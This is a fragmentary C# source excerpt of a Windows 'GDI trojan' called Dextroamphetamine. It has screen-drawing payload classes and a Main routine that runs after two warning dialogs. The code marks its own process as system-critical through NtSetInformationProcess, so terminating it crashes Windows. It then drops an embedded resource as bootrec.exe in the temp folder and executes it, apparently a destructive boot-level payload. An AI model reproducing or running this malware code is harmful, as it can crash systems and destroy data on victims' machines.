...
int yMask);
    ...
    private class staticform : Payloads
    {
        public override void Draw(IntPtr hdc)
        {
   ...
   out IntPtr piSmallVersion, int amountIcons);
    ...
    private class payload11 : Payloads
    {
        ...
        Image r = Dextroamphetamine.Properties.Resources.theheck;
        public override void Draw(IntPtr hdc)
        {
            try
            {
    ...
    public static void Main()
    {
        ...
        Payloads bounceyform = new staticform();
        Payloads type = new Type();
        Payloads cur = new cur();
        Payloads windowtext = new Windowtext();
        if (MessageBox.Show("You have ran a malware called Dextroamphetamine!\r\n" +
        ...
        "Are you sure you want to run?", "GDI-Trojan.Win32.Dextroamphetamine", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
        {
            ...
            "Are you sure?\r\n" +
            "This is the final warning to stop this program from exeucuting.", "GDI-Trojan.Win32.Dextroamphetamine", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
            {
                Process.EnterDebugMode();
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                string path = Path.Combine(Path.GetTempPath(), "bootrec.exe");
                File.WriteAllBytes(path, Dextroamphetamine.Properties.Resources.cool);
                Process.Start(path);
